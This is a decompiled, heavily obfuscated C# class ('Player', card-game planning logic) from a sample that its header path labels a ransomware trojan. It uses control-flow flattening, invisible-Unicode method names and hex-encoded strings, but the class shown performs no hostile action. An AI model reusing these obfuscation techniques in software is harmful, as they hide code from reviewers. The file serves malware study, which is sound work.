// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: TypeLimitingDeserializationBind, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 1D6D78DD-B812-498A-928B-6D9E4655E6A7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0f32fcee5fe0e98a2f219eac2c9b9c19cbb2f48660a676a0992bf38c59cdf153.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -108681720;
      bool flag1;
      string str1;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1604578897)) % 14U)
        {
          case 1:
            str1 = (string) null;
            num1 = (int) num2 * -22898954 ^ 95390040;
            continue;
          case 2:
            str2 = str1;
            num1 = -954103664;
            continue;
          case 3:
            str1 = "456E636F646572457863657074696F6E46616C6C6261";
            num1 = (int) num2 * -337473953 ^ -1053743817;
            continue;
          case 4:
            goto label_1;
          case 5:
            int num3 = !flag2 ? 1037759931 : (num3 = 935730269);
            num1 = num3 ^ (int) num2 * 1496984532;
            continue;
          case 6:
            flag1 = BaseStream == 1;
            num1 = -673357711;
            continue;
          case 7:
            num1 = (int) num2 * -607893877 ^ -856667760;
            continue;
          case 8:
            int num4 = flag1 ? 2045259301 : (num4 = 111041611);
            num1 = num4 ^ (int) num2 * -432179128;
            continue;
          case 9:
            num1 = (int) num2 * -184593782 ^ -626783351;
            continue;
          case 10:
            str1 = "775876";
            num1 = (int) num2 * 746711558 ^ -998498570;
            continue;
          case 11:
            flag2 = BaseStream == 0;
            num1 = (int) num2 * -1102868314 ^ 939142998;
            continue;
          case 12:
            num1 = (int) num2 * -678110166 ^ 1234603684;
            continue;
          case 13:
            num1 = (int) num2 * -1754093890 ^ 1489813865;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = 2016679016;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ 900314544)) % 5U)
        {
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * -683533208 ^ -1482215615;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 2:
            num4 = 0;
            break;
          case 3:
            num1 = (int) num3 * 1752227289 ^ 2056493621;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = 1107716246;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 941674654;
        int num2;
        int[] planningCards;
        int index;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 1212759745)) % 13U)
          {
            case 0:
              ++num2;
              num1 = (int) num4 * 981682629 ^ 2084260618;
              continue;
            case 2:
              num1 = (int) num4 * 876963778 ^ 473498850;
              continue;
            case 3:
              num1 = (int) num4 * 1399827022 ^ 1026531501;
              continue;
            case 4:
              ++index;
              num1 = (int) num4 * -865774106 ^ 2021105886;
              continue;
            case 5:
              planningCards = this.PlanningCards;
              index = 0;
              num1 = (int) num4 * -1516540763 ^ -1684892504;
              continue;
            case 6:
              num3 = planningCards[index];
              num1 = 1901864073;
              continue;
            case 7:
              int num5;
              num1 = num5 = index >= planningCards.Length ? 1006091124 : (num5 = 85701698);
              continue;
            case 8:
              num1 = 1901115722;
              continue;
            case 9:
              planningCardsCount = num2;
              num1 = (int) num4 * 420344910 ^ 480243398;
              continue;
            case 10:
              int num6 = num3 > 0 ? -1186020913 : (num6 = -1632657796);
              num1 = num6 ^ (int) num4 * -712704317;
              continue;
            case 11:
              goto label_1;
            case 12:
              num2 = 0;
              num1 = (int) num4 * -762225268 ^ -2039896894;
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 1700499846;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1471211236)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * -163786897 ^ -1629344467;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
label_1:
      int num1 = -1243817973;
      string str2;
      bool flag;
      int index;
      int planningCard;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2134582285)) % 14U)
        {
          case 0:
            int num3 = flag ? 788714050 : (num3 = 107437831);
            num1 = num3 ^ (int) num2 * 1433145211;
            continue;
          case 1:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * -62665985 ^ -1195899046;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -1105959713 ^ -1875500255;
            continue;
          case 4:
            index = 0;
            num1 = (int) num2 * -848458341 ^ 1505474055;
            continue;
          case 5:
            str1 = Player.\u202A​​‮⁪‫‪‍⁮‪‪⁯⁫​⁪‮⁮⁬⁫‮⁫‬‫‮‏‏⁬‌⁬‬‬‎‪‮‍⁫⁯​⁮‬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1808943992;
            continue;
          case 6:
            int num4 = planningCard == 0 ? 931789934 : (num4 = 1300182992);
            num1 = num4 ^ (int) num2 * -482885175;
            continue;
          case 7:
            num1 = (int) num2 * 40256902 ^ 761091650;
            continue;
          case 8:
            flag = index < this.PlanningCards.Length;
            num1 = -2018907089;
            continue;
          case 9:
            num1 = -1883736840;
            continue;
          case 11:
            ++index;
            num1 = -236304081;
            continue;
          case 12:
            str2 = str1;
            num1 = (int) num2 * -1854432875 ^ -1357687354;
            continue;
          case 13:
            num1 = (int) num2 * 741943439 ^ 366387258;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json["name"].Value,
      PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
      UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
      int[] numArray = new int[count];
label_1:
      int num1 = -616610232;
      int[] planningCards;
      int aIndex;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -972291116)) % 8U)
        {
          case 0:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = -943399071;
            continue;
          case 1:
            num1 = (int) num2 * 1472077389 ^ 608663940;
            continue;
          case 2:
            planningCards = numArray;
            num1 = (int) num2 * -253242983 ^ 370025505;
            continue;
          case 3:
            goto label_1;
          case 4:
            aIndex = 0;
            num1 = (int) num2 * 618720129 ^ 896246449;
            continue;
          case 5:
            flag = aIndex < count;
            num1 = -471124054;
            continue;
          case 6:
            int num3 = !flag ? -539872966 : (num3 = -1864391256);
            num1 = num3 ^ (int) num2 * 532739890;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1655443543;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1379287812)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -1713820557 ^ -973368598;
            continue;
          case 1:
            str = Player.\u206B⁯⁯‬⁬‬⁮‭‮⁯‏⁫‮‭⁭⁮‍⁯‫⁬‮‌‬‏⁮‬⁭‪‬⁭‬‭‌‌‎⁯‮⁫⁪‪‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 1373458177 ^ 716013765;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u202A​​‮⁪‫‪‍⁮‪‪⁯⁫​⁪‮⁮⁬⁫‮⁫‬‫‮‏‏⁬‌⁬‬‬‎‪‮‍⁫⁯​⁮‬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206B⁯⁯‬⁬‬⁮‭‮⁯‏⁫‮‭⁭⁮‍⁯‫⁬‮‌‬‏⁮‬⁭‪‬⁭‬‭‌‌‎⁯‮⁫⁪‪‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
